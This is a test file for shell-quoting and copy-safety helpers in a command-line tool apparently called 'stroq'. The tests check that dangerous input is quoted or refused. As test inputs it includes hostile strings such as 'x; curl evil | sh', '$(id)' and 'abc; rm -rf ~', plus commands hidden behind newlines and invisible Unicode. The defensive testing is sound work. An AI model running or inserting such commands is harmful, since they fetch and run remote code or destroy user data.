import { describe, expect, it } from 'vitest';
import {
  MAX_COMMAND_LENGTH,
  commandLine,
  isCopyable,
  shellQuote,
  unsafeCodePoint,
  unsafeCodePoints,
} from './shell';

describe('shellQuote', () => {
  it('leaves plain words alone', () => {
    expect(shellQuote('7c1e4a90')).toBe('7c1e4a90');
    expect(shellQuote('--session')).toBe('--session');
    expect(shellQuote('config/dev.env')).toBe('config/dev.env');
  });

  it('keeps a hostile value as one word', () => {
    expect(shellQuote('x; curl evil | sh')).toBe("'x; curl evil | sh'");
    expect(shellQuote('$(id)')).toBe("'$(id)'");
    expect(shellQuote('a b')).toBe("'a b'");
  });

  it('escapes a single quote inside the value', () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });

  it('quotes an empty argument', () => {
    expect(shellQuote('')).toBe("''");
  });
});

describe('commandLine', () => {
  it('quotes only the words that need it', () => {
    expect(commandLine('stroq', 'untaint', '--session', 'abc; rm -rf ~')).toBe(
      "stroq untaint --session 'abc; rm -rf ~'",
    );
  });
});

describe('isCopyable', () => {
  it('accepts an ordinary command', () => {
    expect(isCopyable('git log --all -- config/dev.env')).toBe(true);
  });

  it('refuses a newline, which would run on paste', () => {
    expect(isCopyable('stroq verify\ncurl evil | sh')).toBe(false);
    expect(isCopyable('stroq verify\rcurl evil')).toBe(false);
  });

  it('refuses control, zero-width and bidi characters', () => {
    expect(isCopyable('stroq\u0007verify')).toBe(false);
    expect(isCopyable('stroq​verify')).toBe(false);
    expect(isCopyable('stroq ‮evil')).toBe(false);
  });

  it('refuses the word joiner, invisible operators, other invisible format characters and tags', () => {
    for (const code of [0x180e, 0x2060, 0x2064, 0x206a, 0x206f, 0xfff9, 0xe0001, 0xe0041, 0xe007f])
      expect(isCopyable(`stroq${String.fromCodePoint(code)}verify`)).toBe(false);
  });

  it('refuses the other characters Unicode draws as nothing, keeping emoji variation selectors', () => {
    // Soft hyphen, combining grapheme joiner, Arabic letter mark, Hangul fillers, Khmer inherent
    // vowels, Mongolian selectors, shorthand-format controls, musical format characters, and the
    // tag and variation-selector supplement block.
    for (const code of [
      0x00ad, 0x034f, 0x061c, 0x115f, 0x1160, 0x17b4, 0x17b5, 0x180b, 0x180f, 0x3164, 0xffa0,
      0x1bca0, 0x1bca3, 0x1d173, 0x1d17a, 0xe0100, 0xe01ef, 0xe0fff,
    ])
      expect(unsafeCodePoint(`build.sh${String.fromCodePoint(code)}`)).toBe(code);
    // U+FE0F after a heart draws the emoji; it changes a visible character, so it stays allowed.
    expect(unsafeCodePoint(`ok ${String.fromCodePoint(0x2764, 0xfe0f)}`)).toBeNull();
  });

  it('names the first such character by code point, skipping the ones a caller lays out itself', () => {
    expect(unsafeCodePoint('plain é 日本')).toBeNull();
    expect(
      unsafeCodePoint(`a${String.fromCodePoint(0x200b)}b${String.fromCodePoint(0x202e)}`),
    ).toBe(0x200b);
    expect(unsafeCodePoint(`a\nb${String.fromCodePoint(0xe0041)}`)).toBe(0x0a);
    expect(unsafeCodePoint(`a\nb${String.fromCodePoint(0xe0041)}`, [0x0a])).toBe(0xe0041);
    expect(unsafeCodePoints()).toContain(0x202e);
    expect(
      unsafeCodePoints().every((code) => unsafeCodePoint(String.fromCodePoint(code)) === code),
    ).toBe(true);
  });

  it('refuses a command too long to be seen whole', () => {
    expect(isCopyable('a'.repeat(MAX_COMMAND_LENGTH))).toBe(true);
    expect(isCopyable('a'.repeat(MAX_COMMAND_LENGTH + 1))).toBe(false);
  });

  it('refuses an empty command', () => {
    expect(isCopyable('')).toBe(false);
  });
});
